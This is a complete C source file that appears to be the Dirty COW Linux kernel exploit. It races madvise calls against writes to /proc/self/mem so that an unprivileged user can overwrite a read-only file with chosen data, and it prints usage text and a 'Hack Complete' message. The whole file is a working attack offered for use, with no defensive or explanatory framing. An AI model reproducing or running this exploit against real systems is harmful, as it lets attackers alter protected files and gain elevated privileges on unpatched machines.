#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

int gFileHandle = 0;
struct stat gFileStats;

void *gFileMap = NULL;


void *madviseThread( void *pArg )
{
    int i = 0;
    int c = 0;

    for( i = 0; i < 100000000; i++ )
    {
        c += madvise( gFileMap, 100, MADV_DONTNEED );
    }

    printf( "File processed. Check now.\r\n" );

    return NULL;
}

void *writeMemThread( void *pArg )
{
    char *pString = (char *)pArg;


    int fileHandle = open( "/proc/self/mem", O_RDWR );
    int i = 0;
    int c = 0;

    for( i = 0; i < 100000000; i++ )
    {
        // seek to the mapped file in our own memory
        lseek( fileHandle, (uintptr_t)gFileMap, SEEK_SET );

        c += write( fileHandle, pString, strlen( pString ) );
    }

    printf( "Hack Complete. Check now if not already done.\r\n" );

    return NULL;
}

int main( int argc, char *pArgv[] )
{
    char *pSourceFile = pArgv[ 1 ];
    char *pNewData = pArgv[ 2 ];

    if ( pSourceFile == 0 || pNewData == 0 )
    {
        printf( "\r\n" );
        printf( "Not enough args provided.\r\n");
        printf( "Usage: %s file data-for-file\r\n", pArgv[ 0 ] );
        printf( "Example: %s file.txt \"i love pizza\"\r\n", pArgv[ 0 ] );
        printf( "\r\n" );
    }
    else
    {
        printf( "Writing to file: %s", pArgv[ 1 ] );

        gFileHandle = open( pSourceFile, O_RDONLY );
        fstat( gFileHandle, &gFileStats );

        gFileMap = mmap( NULL, gFileStats.st_size, PROT_READ, MAP_PRIVATE, gFileHandle, 0 );

        pthread_t adviseThreadHandle;
        pthread_t writeThreadHandle;

        pthread_create( &adviseThreadHandle, NULL, madviseThread, NULL );
        pthread_create( &writeThreadHandle, NULL, writeMemThread, pNewData );


        pthread_join( adviseThreadHandle, NULL );
        pthread_join( writeThreadHandle, NULL );
    }
    return 0;
}



